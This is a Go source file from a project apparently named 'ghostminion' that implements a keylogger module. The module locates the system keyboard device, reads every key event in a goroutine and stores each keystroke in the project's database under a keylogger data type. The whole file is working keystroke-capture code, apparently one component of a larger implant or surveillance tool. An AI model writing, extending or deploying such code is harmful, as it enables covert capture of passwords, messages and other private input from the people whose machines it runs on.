package apps

import (
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/MarinX/keylogger"
	"sync"
)

type KeyLoggerApp struct {
	stop      chan struct{}
	eventChan chan string
	klwg      sync.WaitGroup
}

func NewKeyLoggerApp() (*KeyLoggerApp, error) {
	return &KeyLoggerApp{
		stop:      make(chan struct{}),
		eventChan: make(chan string, 100),
	}, nil
}

func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()

	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		lgr.Warn("No keyboard found, you may need to provide manual input path")
		return
	}
	lgr.Debug("Found keyboard at path: ", keyboard)

	kl, err := keylogger.New(keyboard)
	if err != nil {
		lgr.Error("Error creating keylogger instance: ", err)
		return
	}
	defer kl.Close()

	c.klwg.Add(2)
	go c.startProducer(kl)
	go c.startConsumer()
	c.klwg.Wait()
}

func (c *KeyLoggerApp) startProducer(kl *keylogger.KeyLogger) {
	defer c.klwg.Done()
	events := kl.Read()
	for {
		select {
		case <-c.stop:
			return
		case e := <-events:
			if e.Type == keylogger.EvKey {
				c.eventChan <- e.KeyString()
			}
		}
	}
}

func (c *KeyLoggerApp) startConsumer() {
	defer c.klwg.Done()
	for {
		select {
		case <-c.stop:
			return
		case key := <-c.eventChan:
			err := db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(key))
			if err != nil {
				lgr.Error("Error writing keylogger data: ", err)
			}
		}
	}
}

func (c *KeyLoggerApp) Stop() {
	close(c.stop)
	close(c.eventChan)
}

func (c *KeyLoggerApp) validateParams() error {
	return nil
}
